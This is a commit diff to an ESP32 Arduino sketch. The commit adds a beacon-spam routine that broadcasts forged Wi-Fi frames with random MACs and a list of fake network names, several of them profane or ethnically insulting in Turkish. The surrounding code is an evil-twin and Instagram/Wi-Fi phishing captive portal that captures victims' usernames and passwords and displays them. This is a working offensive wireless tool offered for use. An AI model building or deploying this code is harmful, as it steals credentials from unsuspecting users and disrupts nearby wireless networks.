1bfce212706d6da9c608c768ffc52aa347c66dc2
saxflx <thtmailii@gmail.com>
2025-08-19 21:44:23 +0300

    Update esp32.ino

--- esp32.ino
+++ esp32.ino
@@ -8,6 +8,7 @@ DNSServer dnsServer;
 WebServer webServer(80);
 
 
+
 typedef struct {
   String ssid;
   String bssid;
@@ -22,16 +23,150 @@ String kullaniciAdi = "";
 String sifre = ""; 
 bool isAPCreated = false;
 bool isInstagramAP = false;
+bool wifiSpamActive = false;
      
+const uint8_t channels[] = {1, 6, 11};
+const bool wpa2 = true;
+const bool appendSpaces = true; 
 
+const char ssids[] PROGMEM = {
+  "babalar firar\n"
+  "saat 200 milyar\n"
+  "kardesim o hareketi yanlis yapıyosun\n"
+  "at kafasi\n"
+  "Cafe Wifi\n"
+  "Starbucks\n"
+  "testesteron necmi\n"
+  "fasulyesine oynamam ha\n"
+  "He amk benidemi dovsunler\n"
+  "Vur kürde amk kürdü\n"
+  "banane amk\n"
+  "fatih\n"
+  "fatih 5G\n"
+  "Beles WiFi\n"
+  "31.bolge\n"
+  "babooo\n"
+  "altima sictim btw\n"
+  "tutmayin kucuk enisteyi\n"
+  "ulan sende bi siktir git amk\n"
+  "sem hayyyirdddir babaaaa\n"
+  "hayir sen neeeeeeolsun istiyon\n"
+  "cok korktum yapmasinlar\n"
+  "siber saldiri\n"
+  "siber miber hiber\n"
+  "nasilsin fistik\n"
+  "nasi yok\n"
+  "dayi geldi sikti gitti\n"
+  "lazer tutuyo oc\n"
+  "Virus deil korkma\n"
+  "heykirbaba3162\n"
+  "vergi.exe\n"
+  "istifa et artik\n"
+  "Kahve Dunyasi\n"
+  "dostum bu cok havali\n"
+  "arkana bak\n"
+  "Ankara Akdere mevzuya bak hele\n"
+  "manifest ne amk\n"
+  "bi kere yalim\n"
+  "sa naber\n"
+  "esp31\n"
+  "level c5\n"
+  "suraya c4 atacan\n"
+  "apo hangi kapinin iti\n"
+  "aponun amk\n"
+  "selooo oc seloo\n"
+  "seyhsaid (asildi)\n"
+  "ismet nereyi imzaladin gine\n"
+  "Saray WiFi\n"
+  "JITEM\n"
+};
+
+
+#include "WiFi.h"
+
+extern "C" {
+#include "esp_wifi.h"
+  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
+  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
+}
+
+
+
+char emptySSID[32];
+uint8_t channelIndex = 0;
+uint8_t macAddr[6];
+uint8_t wifi_channel = 1;
+uint32_t currentTime = 0;
+uint32_t packetSize = 0;
+uint32_t packetCounter = 0;
+uint32_t attackTime = 0;
+uint32_t packetRateTime = 0;
+
+uint8_t beaconPacket[109] = {
+  0x80, 0x00, 0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+  0x00, 0x00,
+  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
+  0xe8, 0x03,
+  0x31, 0x00,
+  0x00, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x20, 0x20, 0x20, 0x20,
+  0x01, 0x08,
+  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+  0x03, 0x01,
+  0x01,
+  0x30, 0x18,
+  0x01, 0x00,
+  0x00, 0x0f, 0xac, 0x02,
+  0x02, 0x00,
+  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
+  0x01, 0x00,
+  0x00, 0x0f, 0xac, 0x02,
+  0x00, 0x00
+};
 
 
 //----------------------------------------------------------
 
 
+void nextChannel() {
+  if (sizeof(channels) > 1) {
+    uint8_t ch = channels[channelIndex];
+    channelIndex++;
+    if (channelIndex > sizeof(channels)) channelIndex = 0;
+
+    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
+      wifi_channel = ch;
+      //wifi_set_channel(wifi_channel);
+      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+    }
+  }
+}
+
+
+//----------------------------------------------------------
+
+
+void randomMac() {
+  for (int i = 0; i < 6; i++)
+    macAddr[i] = random(256);
+}
+
+
+//----------------------------------------------------------
 
 
 void handleRoot() {
+  wifiSpamActive = false;
   String html = R"=====(
 <!DOCTYPE html>
 <html lang="tr">
@@ -93,7 +228,7 @@ void handleRoot() {
   <button onclick="location.href='/wifi-spam'">Wifi Spam</button>
 )=====";
 
-  // Display Evil Twin credentials (Instagram/Wifi) if available
+  
   if (kullaniciAdi != "" && sifre != "") {
     html += R"=====(
   <div class="credentials">
@@ -108,7 +243,7 @@ void handleRoot() {
 )=====";
   }
 
-  // Display WiFi credentials if available
+  
   if (targetSSID != "" && savedPassword != "") {
     html += R"=====(
   <div class="credentials">
@@ -123,7 +258,7 @@ void handleRoot() {
 )=====";
   }
 
-  // Close HTML
+  
   html += R"=====(
 </body>
 </html>
@@ -132,10 +267,7 @@ void handleRoot() {
 }
 
 
-
 //----------------------------------------------------------
-
-
 
 
 void scanNetworks() {
@@ -148,6 +280,75 @@ void scanNetworks() {
 }
 
 
+//----------------------------------------------------------
+
+
+void handleWifiSpam() {
+   
+    String html = R"=====(
+  <!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Wifi Spam</title>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #403f3f;
+    }
+    h1 {
+      margin-bottom: 40px;
+      color: #ffffff;
+    }
+    .status {
+      margin-bottom: 20px;
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: bold;
+    }
+    button {
+      width: 250px;
+      padding: 15px;
+      margin: 10px;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      background-color: #007bff;
+      color: rgb(255, 255, 255);
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <h1>Wifi Spam</h1>
+  <div class="status">Wifi Spam Başladı!</div>
+  <button onclick="stopWifiSpam()">Wifi Spam Durdur</button>
+
+  <script>
+    function stopWifiSpam() {
+      location.href = '/';
+    }
+        setInterval(function() {
+        location.reload();
+    }, 500); 
+  </script>
+</body>
+</html>
+)=====";
+  webServer.send(200, "text/html", html);
+   wifiSpamActive = true;
+}
 
 
 //----------------------------------------------------------
@@ -155,7 +356,9 @@ void scanNetworks() {
 
 
 void handleInstagram() {
+  wifiSpamActive = false; 
   scanNetworks();
+  
   
   String html = R"=====(
 <!DOCTYPE html>
@@ -304,11 +507,7 @@ void handleInstagramWifi(){
 }
 
 
-
-
 //----------------------------------------------------------
-
-
 
 
 void handleInstagramLogin () {
@@ -324,19 +523,19 @@ void handleInstagramLogin () {
     Serial.println(sifre);
     Serial.println("---------------------------");
 
-    // Evil Twin'i kapat
+    
     WiFi.softAPdisconnect(true);
     targetSSID = "";
     isAPCreated = false;
     isInstagramAP = false;
 
-    // Ana AP'yi (ESP32) yeniden başlat
-    WiFi.mode(WIFI_AP);
+   
+    WiFi.mode(WIFI_AP_STA);
     WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
     WiFi.softAP("Esp32","128milyar");
     dnsServer.start(DNS_PORT, "*", apIP);
 
-    // Ana sayfaya yönlendir
+    
     String html = "<script>location.href='/';</script>";
     webServer.send(200, "text/html", html);
     return;
@@ -1040,9 +1239,7 @@ void handleWifiAttack() {
 //----------------------------------------------------------//----------------------------------------------------------
 
 
-void handleWifiSpam() {
-  webServer.send(200, "text/plain", "Wifi Spam");
-}
+
 
 
 
@@ -1064,12 +1261,34 @@ void handleNotFound() {
 
 void setup() {
   Serial.begin(9600);
-  
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP("Esp32", "128milyar");
-  
   dnsServer.start(DNS_PORT, "*", apIP);
+
+    for (int i = 0; i < 32; i++)
+    emptySSID[i] = ' ';
+
+  randomSeed(1);
+
+  packetSize = sizeof(beaconPacket);
+  if (wpa2) {
+    beaconPacket[34] = 0x31;
+  } else {
+    beaconPacket[34] = 0x21;
+    packetSize -= 26;
+  }
+
+  randomMac();
+  
+  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
+  Serial.println("SSIDs:");
+  int i = 0;
+  int len = sizeof(ssids);
+  while(i < len){
+    Serial.print((char)pgm_read_byte(ssids + i));
+    i++;
+  }
   
   webServer.on("/", handleRoot);
   webServer.on("/evil-twin-password", handleEvilTwin);
@@ -1101,4 +1320,67 @@ void setup() {
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
+
+   if (wifiSpamActive) {
+    currentTime = millis();
+    
+    if (currentTime - attackTime > 100) {
+      attackTime = currentTime;
+
+      int i = 0;
+      int j = 0;
+      int ssidNum = 1;
+      char tmp;
+      int ssidsLen = strlen_P(ssids);
+
+      nextChannel();
+
+      while (i < ssidsLen) {
+        j = 0;
+        do {
+          tmp = pgm_read_byte(ssids + i + j);
+          j++;
+        } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
+
+        uint8_t ssidLen = j - 1;
+        macAddr[5] = ssidNum;
+        ssidNum++;
+
+        memcpy(&beaconPacket[10], macAddr, 6);
+        memcpy(&beaconPacket[16], macAddr, 6);
+        memcpy(&beaconPacket[38], emptySSID, 32);
+        memcpy_P(&beaconPacket[38], &ssids[i], ssidLen);
+        beaconPacket[82] = wifi_channel;
+
+        if (appendSpaces) {
+          for (int k = 0; k < 3; k++) {
+            packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, packetSize, false) == ESP_OK;
+            delay(1);
+          }
+        } else {
+          uint16_t tmpPacketSize = (109 - 32) + ssidLen;
+          uint8_t* tmpPacket = new uint8_t[tmpPacketSize];
+          memcpy(&tmpPacket[0], &beaconPacket[0], 37 + ssidLen);
+          tmpPacket[37] = ssidLen;
+          memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], 39);
+
+          for (int k = 0; k < 3; k++) {
+            packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, tmpPacket, tmpPacketSize, false) == ESP_OK;
+            delay(1);
+          }
+
+          delete[] tmpPacket;
+        }
+
+        i += j;
+      }
+    }
+
+    if (currentTime - packetRateTime > 1000) {
+      packetRateTime = currentTime;
+      Serial.print("Packets/s: ");
+      Serial.println(packetCounter);
+      packetCounter = 0;
+    }
+  }
 }
